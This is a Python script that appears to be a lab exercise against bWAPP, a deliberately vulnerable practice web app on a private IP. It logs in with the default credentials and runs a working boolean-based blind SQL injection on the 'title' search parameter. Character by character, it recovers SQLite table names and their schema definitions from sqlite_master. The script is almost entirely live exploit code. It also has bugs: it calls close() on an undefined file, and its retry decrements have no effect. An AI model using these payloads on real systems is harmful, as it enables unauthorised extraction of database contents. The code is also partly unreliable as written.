#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

def GetTables(urlTarget, cookies):  
  tables = []
  sqls = {}
  tempTable = ""
  tempSql = ""
  cntTables = 0
  checkEof = 0
  countTable = 1

  while(True):
    for i in range(1, 11): ## Maximum Length of table's name
      try:
        paramsTarget = {
          "title": "' or 1 and length((select tbl_name from sqlite_master limit " + str(countTable) + ", 1))=" + str(i) + "--",
          "action": "search"
        }


        r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)
      
      except OSError as e:
        i -= 1
        continue

      except Exception as e:
        print(e)
        print("[Length of table's name] Error...")
        exit(1)

      if 'The movie exists in our database!' in r.text:
        ## 테이블 길이를 알아냈으니 테이블 명 추측.
        for j in range(1, i+1):
          for k in range(32, 127): ## Ascii code
            try:
              if k != 34:
                paramsTarget = {
                  "title": "' or 1 and substr((select tbl_name from sqlite_master limit " + str(countTable) + ", 1), " + str(j) + ", 1)=\"" + chr(k) + "\"--",
                  "action": "search"
                }
              else:
                paramsTarget = {
                  "title": "' or 1 and substr((select tbl_name from sqlite_master limit " + str(countTable) + ", 1), " + str(j) + ", 1)=\"\"\"--",
                  "action": "search"
                }

              r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)

            except OSError as e:
              k -= 1
              continue

            except Exception as e:
              print(e)
              print("[table's name] Error...")
              exit(1)
            
            if 'The movie exists in our database!' in r.text:
              tempTable += chr(k)
              
              break

        tables.append(tempTable)

        ## length of sql column
        for x in range(1, 501):
          try:
            paramsTarget = {
              "title": "' or 1 and length((select sql from sqlite_master where tbl_name=\"" + tempTable + "\"))=" + str(x) + "--",
              "action": "search"
            }

            r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)

          except OSError as e:
            x -= 1
            continue

          except Exception as e:
            print(e)
            print("[Length of sql column] Error...")
            exit(1)

          if 'The movie exists in our database!' in r.text:
            for y in range(1, x+1):
              for z in range(32, 127): ## Ascii code
                try:
                  if z != 34:
                    paramsTarget = {
                      "title": "' or 1 and substr((select sql from sqlite_master where tbl_name=\"" + tempTable + "\"), " + str(y) + ", 1)=\"" + chr(z) + "\"--",
                      "action": "search"
                    }
                  else:
                    paramsTarget = {
                      "title": "' or 1 and substr((select sql from sqlite_master where tbl_name=\"" + tempTable + "\"), " + str(y) + ", 1)=\"\"\"--",
                      "action": "search"
                    }

                  r = requests.get(urlTarget, params=paramsTarget, cookies=cookies)

                except OSError as e:
                  z -= 1
                  continue
                  
                except Exception as e:
                  print(e)
                  print("[sql column] Error...")
                  exit(1)

                if 'The movie exists in our database!' in r.text:
                  tempSql += chr(z)
                  
                  break

            sqls[tempTable] = tempSql

        tempTable = ""
        tempSql = ""
        countTable += 1;
        break; # 테이블명 알아내고 다음 테이블

      else: ## False
        if (i == 10): ## sqlite 테이블명 길이가 최대 10이라고 가정하고, 길이 10까지 DB에 존재하지 않으면 모든 테이블 확인한 것으로 추측
          return tables, countTable, sqls
        
        continue;
  f.close()

def GetCookies(urlLogin, paramsLogin):
  try:
    session = requests.session()
    session.post(urlLogin, data=paramsLogin)

    return session.cookies.get_dict()

  except Exception as e:
    print(e)
    print("Error...")
    exit(1)

if __name__=="__main__":
  urlLogin = "http://192.168.91.135/bWAPP/login.php"
  urlTarget = "http://192.168.91.135/bWAPP/sqli_14.php"
  paramsLogin = {
    "login": "bee",
    "password": "bug",
    "security_level": "0",
    "form": "submit"
  }

  cookies = GetCookies(urlLogin, paramsLogin)
  print("## cookies ##")
  print(cookies)
  print("")

  print("Search for a table. It takes a long time if there are a lot of tables.\n")
  #GetTables(urlTarget, cookies)
  tables, cntTables, sqls = GetTables(urlTarget, cookies)
  print("## SQLite tables ##")
  print(tables)
  print("")
  print(sqls)